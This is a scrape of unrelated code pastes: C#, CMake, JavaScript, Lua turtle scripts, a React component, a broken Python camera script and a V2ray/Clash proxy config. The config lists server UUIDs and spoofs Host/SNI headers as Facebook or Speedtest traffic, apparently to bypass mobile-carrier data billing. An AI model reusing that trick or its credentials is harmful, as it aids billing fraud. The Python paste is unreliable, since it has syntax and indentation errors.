        const string CommandChangeConsoleColor = ""4"";
        const string CommandExit = ""5"";

        string name;
        string password;
        bool isWorking = true;

        while (isWorking)
        {
            Console.WriteLine($""Введите:\n{CommandEnterName} чтобы ввести имя.\n"" +
                $""{CommandEnterPassword} чтобы ввести пароль.\n"" +
                $""{CommandWriteDateAndTime} чтобы вывести дату и время.\n"" +
                $""{CommandChangeConsoleColor} чтобы изменить цвет консоли.\n"" +
                $""{CommandExit} чтобы выйти из программы.\n\n\n"");
            Console.Write(""Ввод:"");

            string? userInput = Console.ReadLine();

            switch (userInput)
            {
                case CommandEnterName:
                    name = Console.ReadLine();
                    break;

                case CommandEnterPassword:
                    password = Console.ReadLine();
                    break;

                case CommandWriteDateAndTime:
                    Console.WriteLine(DateTime.Now);
                    break;

                case CommandChangeConsoleColor:
                    Console.BackgroundColor = ConsoleColor.Blue;
                    break;

                case CommandExit:
                    isWorking = false;
                    break;

                default:
                    Console.WriteLine(""Вы ввели неверную команду."");
                    break;
            }

            Console.Write(""Нажмите любую клавишу"");
            Console.ReadKey();
            Console.Clear();
        }
    }
}"
KPj2JLpG,FindANTLR.cmake,cepxuozab,C++,Wednesday 7th of February 2024 11:21:09 AM CDT,"find_package(Java QUIET COMPONENTS Runtime)

if(NOT ANTLR_EXECUTABLE)
  find_program(ANTLR_EXECUTABLE
               NAMES antlr.jar antlr4.jar antlr-4.jar antlr-4.7.2-complete.jar)
endif()

if(ANTLR_EXECUTABLE AND Java_JAVA_EXECUTABLE)
  execute_process(
      COMMAND ${Java_JAVA_EXECUTABLE} -jar ${ANTLR_EXECUTABLE}
      OUTPUT_VARIABLE ANTLR_COMMAND_OUTPUT
      ERROR_VARIABLE ANTLR_COMMAND_ERROR
      RESULT_VARIABLE ANTLR_COMMAND_RESULT
      OUTPUT_STRIP_TRAILING_WHITESPACE)

  if(ANTLR_COMMAND_RESULT EQUAL 0)
    string(REGEX MATCH ""Version [0-9]+(\\.[0-9])*"" ANTLR_VERSION ${ANTLR_COMMAND_OUTPUT})
    string(REPLACE ""Version "" """" ANTLR_VERSION ${ANTLR_VERSION})
  else()
    message(
        SEND_ERROR
        ""Command '${Java_JAVA_EXECUTABLE} -jar ${ANTLR_EXECUTABLE}' ""
        ""failed with the output '${ANTLR_COMMAND_ERROR}'"")
  endif()

  macro(ANTLR_TARGET Name InputFile)
    set(ANTLR_OPTIONS LEXER PARSER LISTENER VISITOR)
    set(ANTLR_ONE_VALUE_ARGS PACKAGE OUTPUT_DIRECTORY DEPENDS_ANTLR)
    set(ANTLR_MULTI_VALUE_ARGS COMPILE_FLAGS DEPENDS)
    cmake_parse_arguments(ANTLR_TARGET
                          ""${ANTLR_OPTIONS}""
                          ""${ANTLR_ONE_VALUE_ARGS}""
                          ""${ANTLR_MULTI_VALUE_ARGS}""
                          ${ARGN})

    set(ANTLR_${Name}_INPUT ${InputFile})

    get_filename_component(ANTLR_INPUT ${InputFile} NAME_WE)

    if(ANTLR_TARGET_OUTPUT_DIRECTORY)
      set(ANTLR_${Name}_OUTPUT_DIR ${ANTLR_TARGET_OUTPUT_DIRECTORY})
    else()
      set(ANTLR_${Name}_OUTPUT_DIR
          ${CMAKE_CURRENT_BINARY_DIR}/antlr4cpp_generated_src/${ANTLR_INPUT})
    endif()

    unset(ANTLR_${Name}_CXX_OUTPUTS)

    if((ANTLR_TARGET_LEXER AND NOT ANTLR_TARGET_PARSER) OR
       (ANTLR_TARGET_PARSER AND NOT ANTLR_TARGET_LEXER))
      list(APPEND ANTLR_${Name}_CXX_OUTPUTS
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}.h
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}.cpp)
      set(ANTLR_${Name}_OUTPUTS
          ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}.interp
          ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}.tokens)
    else()
      list(APPEND ANTLR_${Name}_CXX_OUTPUTS
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}Lexer.h
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}Lexer.cpp
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}Parser.h
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}Parser.cpp)
      list(APPEND ANTLR_${Name}_OUTPUTS
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}Lexer.interp
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}Lexer.tokens)
    endif()

    if(ANTLR_TARGET_LISTENER)
      list(APPEND ANTLR_${Name}_CXX_OUTPUTS
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}BaseListener.h
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}BaseListener.cpp
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}Listener.h
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}Listener.cpp)
      list(APPEND ANTLR_TARGET_COMPILE_FLAGS -listener)
    endif()

    if(ANTLR_TARGET_VISITOR)
      list(APPEND ANTLR_${Name}_CXX_OUTPUTS
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}BaseVisitor.h
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}BaseVisitor.cpp
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}Visitor.h
           ${ANTLR_${Name}_OUTPUT_DIR}/${ANTLR_INPUT}Visitor.cpp)
      list(APPEND ANTLR_TARGET_COMPILE_FLAGS -visitor)
    endif()

    if(ANTLR_TARGET_PACKAGE)
      list(APPEND ANTLR_TARGET_COMPILE_FLAGS -package ${ANTLR_TARGET_PACKAGE})
    endif()

    list(APPEND ANTLR_${Name}_OUTPUTS ${ANTLR_${Name}_CXX_OUTPUTS})

    if(ANTLR_TARGET_DEPENDS_ANTLR)
      if(ANTLR_${ANTLR_TARGET_DEPENDS_ANTLR}_INPUT)
        list(APPEND ANTLR_TARGET_DEPENDS
             ${ANTLR_${ANTLR_TARGET_DEPENDS_ANTLR}_INPUT})
        list(APPEND ANTLR_TARGET_DEPENDS
             ${ANTLR_${ANTLR_TARGET_DEPENDS_ANTLR}_OUTPUTS})
      else()
        message(SEND_ERROR
                ""ANTLR target '${ANTLR_TARGET_DEPENDS_ANTLR}' not found"")
      endif()
    endif()

    add_custom_command(
        OUTPUT ${ANTLR_${Name}_OUTPUTS}
        COMMAND ${Java_JAVA_EXECUTABLE} -jar ${ANTLR_EXECUTABLE}
                ${InputFile}
                -o ${ANTLR_${Name}_OUTPUT_DIR}
                -no-listener
                -Dlanguage=Cpp
                ${ANTLR_TARGET_COMPILE_FLAGS}
        DEPENDS ${InputFile}
                ${ANTLR_TARGET_DEPENDS}
        WORKING_DIRECTORY ${CMAKE_CURRENT_SOURCE_DIR}
        COMMENT ""Building ${Name} with ANTLR ${ANTLR_VERSION}"")
  endmacro(ANTLR_TARGET)

endif(ANTLR_EXECUTABLE AND Java_JAVA_EXECUTABLE)

include(FindPackageHandleStandardArgs)
find_package_handle_standard_args(
    ANTLR
    REQUIRED_VARS ANTLR_EXECUTABLE Java_JAVA_EXECUTABLE
    VERSION_VAR ANTLR_VERSION)
"
Rt6V0F7X,CMakeLists.txt,cepxuozab,C++,Wednesday 7th of February 2024 11:19:39 AM CDT,"cmake_minimum_required(VERSION 3.8 FATAL_ERROR)
project(spreadsheet)

set(CMAKE_CXX_STANDARD 17)
if(MSVC)
  set(
    CMAKE_CXX_FLAGS_DEBUG
    ""${CMAKE_CXX_FLAGS_DEBUG} /JMC""
  )
else()
  set(
    CMAKE_CXX_FLAGS
    ""${CMAKE_CXX_FLAGS} -Wall -Wextra -pedantic -Werror -Wno-unused-parameter -Wno-implicit-fallthrough""
  )
endif()


set(ANTLR_EXECUTABLE ${CMAKE_CURRENT_SOURCE_DIR}/antlr-4.7.2-complete.jar)
include(${CMAKE_CURRENT_SOURCE_DIR}/FindANTLR.cmake)

add_definitions(
  -DANTLR4CPP_STATIC
  -D_SILENCE_ALL_CXX17_DEPRECATION_WARNINGS
)

set(WITH_STATIC_CRT OFF CACHE BOOL ""Visual C++ static CRT for ANTLR"" FORCE)
add_subdirectory(antlr4_runtime)

antlr_target(FormulaParser Formula.g4 LEXER PARSER LISTENER)

include_directories(
  ${ANTLR4_INCLUDE_DIRS}
  ${ANTLR_FormulaParser_OUTPUT_DIR}
  ${CMAKE_CURRENT_SOURCE_DIR}/antlr4_runtime/runtime/src
)

file(GLOB sources
  *.cpp
  *.h
)

add_executable(
  spreadsheet
  ${ANTLR_FormulaParser_CXX_OUTPUTS}
  ${sources}
)

target_link_libraries(spreadsheet antlr4_static)
if(MSVC)
  target_compile_options(antlr4_static PRIVATE /W0)
endif()

install(
  TARGETS spreadsheet
  DESTINATION bin
  EXPORT spreadsheet
)

set_directory_properties(PROPERTIES VS_STARTUP_PROJECT spreadsheet)
"
8LpbxDp5,01. Black Flag,Spocoman,JavaScript,Wednesday 7th of February 2024 11:10:16 AM CDT,"function blackFlag(input) {
    let days = Number(input[0]);
    let dailyPlunder = Number(input[1]);
    let expectedPlunder = Number(input[2]);
    let totalPlunder = 0;

    for (let i = 1; i <= days; i++) {
        totalPlunder += dailyPlunder;
        if (i % 3 == 0) {
            totalPlunder += dailyPlunder * 0.5;
        }
        if (i % 5 == 0) {
            totalPlunder *= 0.7;
        }
    }

    if (totalPlunder >= expectedPlunder) {
        console.log(`Ahoy! ${totalPlunder.toFixed(2)} plunder gained.`);
    } else {
        console.log(`Collected only ${(totalPlunder / expectedPlunder * 100).toFixed(2)}% of the plunder.`);
    }
}"
0ywnWUur,V2ray-BSN,Akun32,YAML,Wednesday 7th of February 2024 11:04:02 AM CDT,"port: 7890
socks-port: 7891
redir-port: 7892
mixed-port: 7893
tproxy-port: 7895
ipv6: false
mode: rule
log-level: silent
allow-lan: true
external-controller: 0.0.0.0:9090
secret: """"
bind-address: ""*""
unified-delay: true
profile:
  store-selected: true
  store-fake-ip: true
dns:
  enable: true
  ipv6: false
  use-host: true
  enhanced-mode: fake-ip
  listen: 0.0.0.0:7874
  nameserver:
    - 8.8.8.8
    - 1.0.0.1
    - https://dns.google/dns-query
  fallback:
    - 1.1.1.1
    - 8.8.4.4
    - https://cloudflare-dns.com/dns-query
    - 112.215.203.254
  default-nameserver:
    - 8.8.8.8
    - 1.1.1.1
    - 112.215.203.254
  fake-ip-range: 198.18.0.1/16
  fake-ip-filter:
    - ""*.lan""
    - ""*.localdomain""
    - ""*.example""
    - ""*.invalid""
    - ""*.localhost""
    - ""*.test""
    - ""*.local""
    - ""*.home.arpa""
    - time.*.com
    - time.*.gov
    - time.*.edu.cn
    - time.*.apple.com
    - time1.*.com
    - time2.*.com
    - time3.*.com
    - time4.*.com
    - time5.*.com
    - time6.*.com
    - time7.*.com
    - ntp.*.com
    - ntp1.*.com
    - ntp2.*.com
    - ntp3.*.com
    - ntp4.*.com
    - ntp5.*.com
    - ntp6.*.com
    - ntp7.*.com
    - ""*.time.edu.cn""
    - ""*.ntp.org.cn""
    - +.pool.ntp.org
    - time1.cloud.tencent.com
    - music.163.com
    - ""*.music.163.com""
    - ""*.126.net""
    - musicapi.taihe.com
    - music.taihe.com
    - songsearch.kugou.com
    - trackercdn.kugou.com
    - ""*.kuwo.cn""
    - api-jooxtt.sanook.com
    - api.joox.com
    - joox.com
    - y.qq.com
    - ""*.y.qq.com""
    - streamoc.music.tc.qq.com
    - mobileoc.music.tc.qq.com
    - isure.stream.qqmusic.qq.com
    - dl.stream.qqmusic.qq.com
    - aqqmusic.tc.qq.com
    - amobile.music.tc.qq.com
    - ""*.xiami.com""
    - ""*.music.migu.cn""
    - music.migu.cn
    - ""*.msftconnecttest.com""
    - ""*.msftncsi.com""
    - msftconnecttest.com
    - msftncsi.com
    - localhost.ptlogin2.qq.com
    - localhost.sec.qq.com
    - +.srv.nintendo.net
    - +.stun.playstation.net
    - xbox.*.microsoft.com
    - xnotify.xboxlive.com
    - +.battlenet.com.cn
    - +.wotgame.cn
    - +.wggames.cn
    - +.wowsgame.cn
    - +.wargaming.net
    - proxy.golang.org
    - stun.*.*
    - stun.*.*.*
    - +.stun.*.*
    - +.stun.*.*.*
    - +.stun.*.*.*.*
    - heartbeat.belkin.com
    - ""*.linksys.com""
    - ""*.linksyssmartwifi.com""
    - ""*.router.asus.com""
    - mesu.apple.com
    - swscan.apple.com
    - swquery.apple.com
    - swdownload.apple.com
    - swcdn.apple.com
    - swdist.apple.com
    - lens.l.google.com
    - stun.l.google.com
    - +.nflxvideo.net
    - ""*.square-enix.com""
    - ""*.finalfantasyxiv.com""
    - ""*.ffxiv.com""
    - ""*.mcdn.bilivideo.cn""
    - +.media.dssott.com
proxies:
  - name: ทรูโนโปร❌
    server: v2ray-true.freezero.online
    port: 443
    type: vless
    uuid: 9615c011-89ee-4be1-b59c-39564587c885
    cipher: auto
    tls: true
    skip-cert-verify: true
    servername: zero.bsn-free.online
    network: ws
    ws-opts:
      path: /vless
      headers:
        Host: zero.bsn-free.online
    udp: true
  - name: ดีแทคโนโปร❌
    server: v2ray-dtac.freezero.online
    port: 443
    type: vless
    uuid: 9615c011-89ee-4be1-b59c-39564587c885
    cipher: auto
    tls: true
    skip-cert-verify: true
    servername: zero.bsn-free.online
    network: ws
    ws-opts:
      path: /vless
      headers:
        Host: zero.bsn-free.online
    udp: true
  - name: ทรูโปรเฟสบุ๊คเกมส์มิ่ง❌
    server: zero.bsn-free.online
    port: 443
    type: vless
    uuid: 9615c011-89ee-4be1-b59c-39564587c885
    cipher: auto
    tls: true
    skip-cert-verify: true
    servername: fbcdn.net
    network: ws
    ws-opts:
      path: /vless
      headers:
        Host: fbcdn.net
    udp: true
  - name: เอไอเอส❌
    server: zero.bsn-free.online
    port: 443
    type: vless
    uuid: 9615c011-89ee-4be1-b59c-39564587c885
    cipher: auto
    tls: true
    skip-cert-verify: true
    servername: www.speedtest.net
    network: ws
    ws-opts:
      path: /vless
      headers:
        Host: www.speedtest.net
    udp: true
  - name: ทรูโนโปร✅
    server: v2ray-true.freezero.online
    port: 443
    type: vless
    uuid: 97c6a339-589f-49ad-a556-4f763e1e84fc
    cipher: auto
    tls: true
    skip-cert-verify: true
    servername: z.bsn-free.online
    network: ws
    ws-opts:
      path: /xrayws
      headers:
        Host: z.bsn-free.online
    udp: true
  - name: ดีแทคโนโปร✅
    server: v2ray-dtac.freezero.online
    port: 443
    type: vless
    uuid: 97c6a339-589f-49ad-a556-4f763e1e84fc
    cipher: auto
    tls: true
    skip-cert-verify: true
    servername: z.bsn-free.online
    network: ws
    ws-opts:
      path: /xrayws
      headers:
        Host: z.bsn-free.online
    udp: true
  - name: ทรูโปรเฟสบุ๊คเกมส์มิ่ง✅
    server: z.bsn-free.online
    port: 443
    type: vless
    uuid: 97c6a339-589f-49ad-a556-4f763e1e84fc
    cipher: auto
    tls: true
    skip-cert-verify: true
    servername: fbcdn.net
    network: ws
    ws-opts:
      path: /xrayws
      headers:
        Host: fbcdn.net
    udp: true
  - name: เอไอเอส✅
    server: z.bsn-free.online
    port: 443
    type: vless
    uuid: 97c6a339-589f-49ad-a556-4f763e1e84fc
    cipher: auto
    tls: true
    skip-cert-verify: true
    servername: www.speedtest.net
    network: ws
    ws-opts:
      path: /xrayws
      headers:
        Host: www.speedtest.net
    udp: true
proxy-groups:
  - name: VPS-BSN
    type: select
    proxies:
      - ทรูโนโปร❌
      - ดีแทคโนโปร❌
      - ทรูโปรเฟสบุ๊คเกมส์มิ่ง❌
      - เอไอเอส❌
      - ทรูโนโปร✅
      - ดีแทคโนโปร✅
      - ทรูโปรเฟสบุ๊คเกมส์มิ่ง✅
      - เอไอเอส✅
rules:
  - MATCH,VPS-BSN"
5uUVYEYf,Untitled,ERROR_CODE,Python,Wednesday 7th of February 2024 10:54:23 AM CDT,"import cv2 #подключение библиотеки OpenCv
import serial from datetime #подключение библиотеки даты
import datetime as dt #сокращение библиотеки 
comPort = ""COM3""#подключения порта робота
baudRate = 9600#скорость передачи данных бит/сек
leo = serial.Serial(comPort, baudRate)#подключение ком порта и скорости передачи данных
cam = cv2.VideoCapture(0)#подключение основ. камеры
cam.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)#высота изображения
cam.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)#ширина изображения
def snapPhoto(date, frame): #создание функции
   path = ""Photo/""+date+"".jpg""#вид фотографии
    cv2.imshow(""Galerry"", frame) #создание окна и вывод видео
   cv2.imwrite(path, frame)#сохранение фотографии
    print(""Saved"")#вывод в консоль
while True:#цикл
    _, frame = cam.read()   #чтение изоб. с основ. камеры
 line = leo.readline()#чтение данных из порта
    decode_line = str(line[0:len(line)-2].decode(""UTF-8""))#обрезание лишних символов
    dateTime = dt.now().strftime(""%Y_%m_%d_%H_%M_%S"")#установка даты на фотографию
    if(decode_line==""photo""):  #условие если данные из порта это photo то
      snapPhoto(dateTime, frame)#объеденение даты с видео
        decode_line=""""#очистка данных порта
    cv2.waitKey(1)#задержка"
caq0Pna4,miner,Reink,Lua,Wednesday 7th of February 2024 10:47:42 AM CDT,"--[[

Creation d'un programme de minage pour turtle 

Prerequis
	- Inserer deux stack de charbons dans le slot 1 et 2 de la turtle
	- Positionner la turtle a la couche 0 ou inferieur
	
a faire dans le programme :
- Faire le plein en carburant de la turtle
- Faire le minage couche par couche de la zone en 10 par 10 sur 64 couches
- Entre chaque couche verifier qu'il y a assez de place dans l'inventaire pour la couche suivante


Composition de l'inventaire de la turtle :
1 = carburant
2 = carburant
le reste est vide

]]

local hauteur = 0

function carburant()
	term.clear()
	term.setCursorPos(1,1)
	print(""Chargement du carburant..."")
	turtle.select(1)
	turtle.refuel()
	turtle.select(2)
	turtle.refuel()
	turtle.select(1)
end

function checkPlace()
	term.clear()
	term.setCursorPos(1,1)
	print(""Verification de l'espace libre dans l'inventaire..."")
	espace = turtle.getItemCount(15) + turtle.getItemCount(16)
	if espace ~= 0 then
		videInventaire()
	end
end

function videInventaire()
term.clear()
	term.setCursorPos(1,1)
	print(""La turtle va vider son inventaire..."")
	for i = 0,hauteur do
		turtle.up()
	end
	turtle.turnLeft()
	turtle.turnLeft()
	for i = 1,16 do
		turtle.select(i)
		turtle.drop()
	end
	turtle.turnLeft()
	turtle.turnLeft()
	for i = 0,hauteur do
		turtle.down()
	end
end

function minage()
term.clear()
	term.setCursorPos(1,1)
	print(""Minage en cours..."")
	for i=0,63 do
		for j=1,5 do
			for k=1,10 do
				turtle.digDown()
				turtle.forward()
			end
			turtle.turnRight()
			turtle.forward()
			turtle.turnRight()
			for k=1,10 do
				turtle.digDown()
				turtle.forward()
			end
			turtle.turnLeft()
			turtle.forward()
			turtle.turnLeft()
		end
		turtle.turnLeft()
		for j=1,11 do
			turtle.forward()
		end
		turtle.turnRight()
		turtle.down()
		hauteur = hauteur + 1
		checkPlace()
	end
	videInventaire()
	for i = 0,hauteur do
		turtle.up()
	end
	turtle.turnLeft()
	turtle.turnLeft()
	for i = 1,16 do
		turtle.select(i)
		turtle.drop()
	end
	turtle.turnLeft()
	turtle.turnLeft()
end

carburant()
minage()"
pWqRmypU,meltingManager,Reink,Lua,Wednesday 7th of February 2024 10:45:33 AM CDT,"--[[

Creation d'un programme de fonte des minerais

Prerequis
	- la turtle est positionnee a cote d'un coffre de minerais a cuire et d'un coffre de charbon
	
a faire dans le programme :
- Verifier le niveau de fuel dans la turtle et besoin faire le plein
- Prendre les minerais dans le coffre
- Deposer les minerais dans les fours
- Mettre un nombre de charbon adequat dans les fours pour cuire les minerais
- Recuperer les lingots apres la cuisson


Composition de l'inventaire de la turtle :
vide

]]

local items = {}

function checkFuel()
	term.clear()
	term.setCursorPos(1,1)
	print(""Verification de carburant..."")
	niveau = turtle.getFuelLevel()
	if niveau > 100 then
		print(""Niveau de carburant suffisant"")
	else
		print(""Niveau de carburant insuffisant"")
		turtle.select(16)
		turtle.suckDown() --A verifier le comportement lorsque le coffre est vide ou comporte moins d'item que voulu
		turtle.refuel()
		turtle.select(1)
	end
end

function coffrePlein()
	term.clear()
	term.setCursorPos(1,1)
	print(""Verification de la presence de minerai dans le coffre..."")
	turtle.select(1)
	turtle.suck()
	nb = turtle.getItemCount()
	turtle.drop()
	if nb ~= 0 then
		return true
	else	
		return false
	end
end

function prendreMinerai()
	term.clear()
	term.setCursorPos(1,1)
	print(""Verification de la presence de minerai dans le coffre..."")
	if coffrePlein() then
		print(""Il y a un ou des minerais dans le coffre !"")
		for i=1,8 do
			turtle.select(i)
			turtle.suck()
			items[i] = turtle.getItemCount()
		end
	else
		print(""Pas de minerai dans le coffre !"")
	end
end

function prendreCharbon()
	for i=1,8 do
		turtle.select(1)
		nbChar = math.ceil(items[i]/8)
		turtle.suckDown(nbChar)
	end
end

function deposeMinerai()
	turtle.up()
	turtle.up()
	turtle.turnLeft()
	turtle.turnLeft()
	for i=1,8 do
		turtle.forward()
		turtle.select(i)
		turtle.dropDown()
	end
	turtle.turnLeft()
	turtle.turnLeft()
	for i=1,8 do
		turtle.forward()
	end
	turtle.down()
	turtle.down()
end

function deposeCharbon()
	turtle.up()
	turtle.turnLeft()
	turtle.forward()
	turtle.turnLeft()
	for i=1,8 do
		turtle.forward()
		turtle.turnLeft()
		turtle.select(i)
		turtle.drop()
		items[i] = nil
		turtle.turnRight()
	end
	turtle.turnLeft()
	turtle.turnLeft()
	for i=1,8 do
		turtle.forward()
	end
	turtle.turnRight()
	turtle.forward()
	turtle.down()
	turnLeft()
end

function recupLingot()
	turtle.turnLeft()
	turtle.turnLeft()
	for i=1,8 do
		turtle.forward()
		turtle.select(i)
		turtle.suckUp()
	end
	turtle.forward()
	for i=1,8 do
		turtle.select(i)
		turtle.drop()
	end
	turtle.turnLeft()
	turtle.turnLeft()
	for i=1,9 do
		turtle.forward()
	end
end

checkFuel()
prendreMinerai()
deposeMinerai()
prendreCharbon()
deposeCharbon()
os.sleep(660)
recupLingot()"
HQzC7AnJ,lumberjack,Reink,Lua,Wednesday 7th of February 2024 10:43:24 AM CDT,"--[[

Creation d'un programme de bucheronnage pour turtle 

a faire dans le programme :
- Verification de bonnes conditions pour le lancement
	- Suffisemment de fuel soit un niveau superieur a 300 sinon faire le plein
	- Presence de suffisemment de pousse d'arbre dans l'inventaire (nombre superieur a 10)
- Debut de la routine :
	- Pour chaque arbre verifier si l'arbre a pousser, si oui l'abattre sinon verifier qu'il y a une pousse et sinon la planter
- Faire une pause de 10 minutes et recommencer le cycle 

Composition de l'inventaire de la turtle :
1 = carburant
2 = pousse d'arbre (chene)

]]

local nbArbre = 10

function checkFuel()
	term.clear()
	term.setCursorPos(1,1)
	print(""Verification de carburant..."")
	niveau = turtle.getFuelLevel()
	if niveau > (nbArbre*3) then
		print(""Niveau de carburant suffisant"")
	else
		print(""Niveau de carburant insuffisant"")
		turtle.select(1)
		quantite = 	turtle.getItemCount()
		if quantite == 0 then
			print(""Il n'y a plus de carburant dans la turtle !"")
			turtle.suckDown() --A verifier le comportement lorsque le coffre est vide ou comporte moins d'item que voulu
			turtle.refuel()
		else
			print(""Ajout de carburant dans la turtle !"")
			turtle.refuel()
		end
	end
end

function checkSapling()
	term.clear()
	term.setCursorPos(1,1)
	print(""Verification des pousses..."")
	turtle.select(2)
	nombre = turtle.getItemCount()
	if nombre > nbArbre then
		print(""Nombre de pousses suffisant"")
	else
		print(""Nombre de pousses insuffisant"")
		turtle.turnRight()
		turtle.suck() --A verifier le comportement lorsque le coffre est vide ou comporte moins d'item que voulu
	end
end

function chopTree()
	term.clear()
	term.setCursorPos(1,1)
	print(""Verification presence d'un arbre..."")
	turtle.select(3)
	data = turtle.inspect() --A verifier le retour lorsque c'est effectivement un tronc d'arbre devant
	if data == ""minecraft:oak_log"" then
		print(""Recolte de l'arbre !"")
		while data == ""minecraft:oak_log"" do
			turtle.dig()
			turtle.digUp()
			turtle.up()
			data = turtle.inspect()
		end
		blockDown = turtle.detectDown()
		while blockDown == false do
			turtle.down()
		end
		print(""Plantation du nouvel arbre !"")
		turtle.select(2)
		turtle.place()
	end
end

function routine()
	turtle.forward()
	turtle.forward()
	turtle.forward()
	turtle.turnLeft()
	chopTree()
	turtle.turnRight()
	for i=1,nbArbre-1 do
		for j=1,5 do
			turtle.forward()
		end
		turtle.turnLeft()
		chopTree()
		turtle.turnRight()
	end
	turtle.turnRight()
	turtle.turnRight()
	nbblock = (nbArbre-1) * 5 + 3
	for h=1,nbblock do
			turtle.forward()
	end
	turtle.turnRight()
	turtle.turnRight()
end

function videInventaire()
	turtle.turnLeft()
	for i = 3,16 do
		turtle.select(i)
		turtle.drop()
	end
	turtle.turnRight()
end

while true do
	checkFuel()
	checkSapling()
	routine()
	videInventaire()
	os.sleep(600)
end"
tM88AvDq,Untitled,lodha1503,JavaScript,Wednesday 7th of February 2024 10:34:24 AM CDT,"import React from ""react"";
import tw from ""twin.macro"";
import styled, { css } from ""styled-components/macro"";
import { Container, ContentWithPaddingXl } from ""components/misc/Layouts.js"";
import { SectionHeading, Subheading as SubheadingBase } from ""components/misc/Headings.js"";
import { SectionDescription } from ""components/misc/Typography.js"";
 
const HeadingContainer = tw.div``;
const Heading = tw(SectionHeading)``;
const Subheading = tw(SubheadingBase)`text-center mb-3 font-Lato`;
const Description = tw(SectionDescription)`mx-auto text-center`;
 
// Adjusted for dynamic sizing
const CardsContainer = tw.div`flex flex-wrap justify-center -mx-4`;
const Card = styled.div`
  ${tw`mt-24 flex flex-col items-center px-4`}
  width: ${props => props.isLarge ? 'calc(25% - 2rem)' : 'calc(16.66667% - 2rem)'};
`;
 
 
// Use inline styles for dynamic image size based on role
const CardImage = styled.div`
  ${props => css`background-image: url(""${props.imageSrc}"");`}
  ${tw`bg-no-repeat bg-cover bg-center rounded-full`}
  width: ${props => (props.isLarge ? '200px' : '130px')};
  height: ${props => (props.isLarge ? '200px' : '130px')};
  border: 2px solid orange;
  box-shadow: 0 0 10px orange ; /* Add border shadow */

`;
 
 
const CardContent = styled.div`
  ${tw`flex flex-col items-center mt-6`}
  
  .position {
    ${tw`uppercase text-lg font-bold tracking-widest  text-orange-600 font-Philosopher`}
  }
  
  .name {
    ${tw`mt-2 text-xl text-center font-semibold text-orange-500 font-Lato`}
    ${props => !props.isLarge && css`font-size: 1rem;`} /* Smaller font size for Assistant Heads */
  }
`;
 
 
const CardLinks = styled.div`
  ${tw`mt-6 flex justify-center`}
  .link {
    ${tw`mr-8 last:mr-0 text-black hocus:text-black transition duration-300 font-Philosopher`}
    .icon {
      ${tw`fill-current w-6 h-6`}
      color: ${props => props.iconColor || '#0000ff60'}; /* Fallback color */
    }
  }
`;
 
 
export default ({
  heading = ""Meet These Fine Folks."",
  subheading = """",
  cards = []
}) => {
  // Filter cards into two groups
  const heads = cards.filter(card => card.position.toLowerCase().includes(""head"") && !card.position.toLowerCase().includes(""assistant""));
  const assistantHeads = cards.filter(card => card.position.toLowerCase().includes(""assistant""));
 
  return (
    <Container>
      <ContentWithPaddingXl>
        <HeadingContainer>
          {subheading && <Subheading>{subheading}</Subheading>}
          {heading && <Heading>{heading}</Heading>}
        </HeadingContainer>
        {/* Heads */}
        <CardsContainer>
          {heads.map((card, index) => (
            <Card key={index} isHead={true} isLarge={index < 3}> {/* Update here for dynamic class application */}
              <div className=""card-image-background"">
                <CardImage imageSrc={card.imageSrc} isLarge={true} /> {/* Assume all heads are large */}
              </div>
              <CardContent>
                <span className=""position"">{card.position}</span>
                <span className=""name"">{card.name}</span>
                <CardLinks>
                  {card.links.map((link, linkIndex) => (
                    <a key={linkIndex} className=""link"" href={link.mail ? `mailto:${link.mail}` : link.url} target={link.mail ? ""_self"" : ""_blank""} rel=""noopener noreferrer"">
                      <link.icon className=""icon"" />
                    </a>
                  ))}
                </CardLinks>
              </CardContent>
            </Card>
          ))}
        </CardsContainer>
        {/* Assistant Heads */}
        <CardsContainer>
          {assistantHeads.map((card, index) => (
            <Card key={index}>
              <div className=""card-image-background"">
                <CardImage imageSrc={card.imageSrc} /> {/* Assistant heads use default size */}
              </div>
              <CardContent>
                <span className=""position"">{card.position}</span>
                <span className=""name"">{card.name}</span>
                <CardLinks>
                  {card.links.map((link, linkIndex) => (
                    <a key={linkIndex} className=""link"" href={link.mail ? `mailto:${link.mail}` : link.url} target={link.mail ? ""_self"" : ""_blank""} rel=""noopener noreferrer"">
                      <link.icon className=""icon"" />
                    </a>
                  ))}
                </CardLinks>
              </CardContent>
            </Card>
          ))}
        </CardsContainer>
      </ContentWithPaddingXl>
    </Container>
  );
};
 "
